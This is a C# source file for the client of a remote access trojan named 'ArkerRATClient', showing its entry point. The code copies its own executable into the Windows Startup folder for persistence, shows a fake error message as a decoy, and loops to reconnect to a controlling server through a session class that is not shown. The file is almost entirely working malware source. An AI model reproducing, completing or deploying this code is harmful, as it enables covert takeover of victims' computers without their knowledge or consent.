using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Net;
using System.Threading;
using System.IO;
using System.Security.Principal;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace ArkerRATClient
{
    internal class Program
    {
        private static string title = string.Empty;
        private static string message = string.Empty;
        private static int autoStart = 0;

        private static void Main(string[] args)
        {
            if(autoStart ==1)
            {
                CopyItSelfToStartUp();
            }
           
            if (!string.IsNullOrEmpty(title) || !string.IsNullOrEmpty(message))
            {
                Task.Run(() => FakeError());
            }
           
            while (true)
                {
                    if (RATClientSession.noConnection)
                    {
                        Connect();
                    }
                    Thread.Sleep(1000);
                }
        }

        private static async Task Connect()
        {
                try
                {
                    if (!RATClientSession.uninstallFix)
                    {
                        RATClientSession.ClientSession();
                    }
                }
                catch (Exception ex) { RATClientSession.noConnection = true; }
        }

        private static void CopyItSelfToStartUp()
        {
            Task.Run(() =>
            {
            byte[] arkerRatFileBytes = File.ReadAllBytes(Directory.GetCurrentDirectory() + @"\" + AppDomain.CurrentDomain.FriendlyName);
                
                File.WriteAllBytes("C:\\Users\\"+Environment.UserName+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"+ AppDomain.CurrentDomain.FriendlyName, arkerRatFileBytes);
            });
        }

        private static void FakeError()
        {
            MessageBox.Show(title + "\n\n" + message);
        }
    }
}
